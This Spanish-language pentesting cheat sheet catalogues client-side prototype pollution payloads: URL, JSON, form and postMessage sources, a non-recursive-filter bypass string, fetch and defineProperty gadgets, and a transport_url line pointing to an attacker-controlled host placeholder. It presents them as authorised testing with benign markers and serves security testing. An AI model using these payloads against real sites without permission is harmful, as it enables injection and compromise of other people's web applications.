# 🗡️ Prototype pollution: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Fuentes de URL

```text
https://{ORIGEN}/?__proto__[marcaPrueba]=pp-123
https://{ORIGEN}/?__proto__.marcaPrueba=pp-123
https://{ORIGEN}/#__proto__[marcaPrueba]=pp-123
```

**Cuándo usarlo:** Probar cada parser por separado. En DevTools verificar Object.prototype.marcaPrueba; el eco de la URL no demuestra contaminación.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).


## 🧭 Payloads por contexto

### JSON y constructor.prototype

```json
{"__proto__":{"marcaPrueba":"pp-123"}}
{"constructor":{"prototype":{"marcaPrueba":"pp-123"}}}
{"options":{"__proto__":{"marcaPrueba":"pp-123"}}}
```

**Cuándo usarlo:** Cada línea es un documento JSON independiente. Requiere un merge profundo inseguro; JSON.parse solo no contamina prototipos.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).


### Forma URL encoded y mensaje

```text
__proto__%5BmarcaPrueba%5D=pp-123
constructor%5Bprototype%5D%5BmarcaPrueba%5D=pp-123
{"__proto__":{"marcaPrueba":"pp-123"}}
```

**Cuándo usarlo:** Las dos primeras líneas requieren parser de formulario con anidación; la tercera es event.data JSON si el receptor hace merge. Confirmar origen y herencia.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).


## 🔥 Payloads avanzados

### Gadgets de API de navegador

```text
https://{ORIGEN}/?__proto__[headers][X-Prueba]=pp-123
https://{ORIGEN}/?__proto__[value]=pp-123
```

**Cuándo usarlo:** Primera: fetch con options sin headers propios. Segunda: Object.defineProperty con descriptor sin value. Confirmar el gadget y sink observados.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis).


### Rastreo y control local

```js
Object.prototype.marcaPrueba
({}).marcaPrueba
Object.defineProperty(Object.prototype,'marcaPrueba',{configurable:true,get(){console.trace('marcaPrueba');return 'pp-123'}})
```

**Cuándo usarlo:** Las dos primeras expresiones solo leen. Ejecutar la tercera en DevTools de la cuenta propia y recargar para limpiar; una traza de lectura no equivale a sink explotable.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).


## 🔬 Pruebas guiadas por escenario

### 1. Query con corchetes

**Objetivo:** Probar una fuente de URL que convierte parámetros anidados en objetos.

```text
https://{ORIGEN}/?__proto__[marcaPrueba]=prueba-123
```

**Interpretación:** En DevTools observar Object.prototype.marcaPrueba; un parámetro reflejado no implica contaminación.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 2. Query con puntos

**Objetivo:** Distinguir parser que acepta notación de puntos.

```text
https://{ORIGEN}/?__proto__.marcaPrueba=prueba-123
```

**Interpretación:** Probar en página propia y recargar entre variantes para limpiar el contexto de JavaScript.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 3. Fragmento de URL

**Objetivo:** Verificar si la SPA parsea y fusiona location.hash.

```text
https://{ORIGEN}/#__proto__[marcaPrueba]=prueba-123
```

**Interpretación:** El fragmento no llega al servidor; requiere código cliente que lo procese y haga merge.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 4. Entrada JSON

**Objetivo:** Comprobar merge profundo de JSON controlado.

```json
{"__proto__":{"marcaPrueba":"prueba-123"}}
```

**Interpretación:** JSON.parse conserva la clave; solo el merge inseguro la lleva al prototipo. Verificar en la misma página.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 5. constructor.prototype

**Objetivo:** Probar ruta alternativa cuando __proto__ se filtra.

```json
{"constructor":{"prototype":{"marcaPrueba":"prueba-123"}}}
```

**Interpretación:** Confirmar que un objeto nuevo hereda la marca; un eco del JSON no es prueba.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 6. Filtro no recursivo

**Objetivo:** Probar el patrón documentado de eliminación única de __proto__.

```text
https://{ORIGEN}/?__pro__proto__to__.marcaPrueba=prueba-123
```

**Interpretación:** Solo aplica si se observó una sanitización por replace no recursiva; comparar antes/después.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 7. Propiedad y gadget de prueba

**Objetivo:** Comprobar si una propiedad heredada llega a un sink sin usar código activo.

```text
https://{ORIGEN}/?__proto__[transport_url]=https%3A%2F%2F{CONTROLLED_HOST}%2Fpp-123
```

**Interpretación:** Una solicitud al host controlado demuestra gadget solo si el código del sitio usa esa propiedad; no asumir XSS.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md).

### 8. Lectura de control

**Objetivo:** Verificar contaminación local y limpiar el estado recargando.

```js
({}).marcaPrueba === 'prueba-123' ? 'contaminado' : 'sin evidencia'
```

**Interpretación:** La propiedad heredada es una primitive; un reporte de impacto requiere gadget y sink comprobados.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 9. Query anidada bajo opciones

**Objetivo:** Probar parser que convierte una estructura options anidada.

```text
https://{ORIGEN}/?options[__proto__][marcaPrueba]=prueba-123
```

**Interpretación:** Solo hay contaminación si options llega a un merge profundo; comprobar Object.prototype en ese contexto.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 10. Constructor por corchetes

**Objetivo:** Probar alternativa de notación al filtro que bloquea constructor.prototype literal.

```text
https://{ORIGEN}/?constructor[prototype][marcaPrueba]=prueba-123
```

**Interpretación:** Comparar con dot notation y confirmar herencia; no inferir de la URL aceptada.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 11. Mensaje JSON a fuente de merge

**Objetivo:** Probar si el receptor fusiona event.data sin filtrar claves.

```js
destino.contentWindow.postMessage(JSON.parse('{"__proto__":{"marcaPrueba":"prueba-123"}}'),'https://{ORIGEN}')
```

**Interpretación:** Requiere un handler de mensajes que haga merge de datos; verificar marca en la ventana receptora.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 12. Gadget fetch headers

**Objetivo:** Probar un fetch del sitio cuyo objeto options omite headers y hereda la propiedad.

```text
https://{ORIGEN}/?__proto__[headers][X-Prueba]=prueba-123
```

**Interpretación:** Verificar en DevTools que la solicitud saliente a un endpoint propio contiene X-Prueba. Una marca en Object.prototype sola no prueba gadget.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis).

### 13. Gadget Object.defineProperty value

**Objetivo:** Probar descriptor sin valor propio pasado a Object.defineProperty por el código cliente.

```text
https://{ORIGEN}/?__proto__[value]=prueba-123
```

**Interpretación:** Solo aplica si se observó ese descriptor; comprobar que la propiedad definida toma el marcador y que un sink posterior lo usa.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis).

### 14. Getter de rastreo local

**Objetivo:** Localizar lectura de un posible gadget tras confirmar fuente de contaminación.

```js
Object.defineProperty(Object.prototype,'marcaPrueba',{configurable:true,get(){console.trace('marcaPrueba');return 'prueba-123'}})
```

**Interpretación:** Ejecutar solo en DevTools de cuenta propia y recargar al terminar. La traza muestra lectura, no explotación sin sink.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/prototype-pollution/client-side).

### 15. Formulario anidado a merge

**Objetivo:** Probar si el parser urlencoded crea un objeto y el cliente lo fusiona profundamente.

```text
__proto__%5BmarcaPrueba%5D=prueba-123
```

**Interpretación:** Enviar como cuerpo application/x-www-form-urlencoded únicamente a una función propia que procese ese formato; observar herencia.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
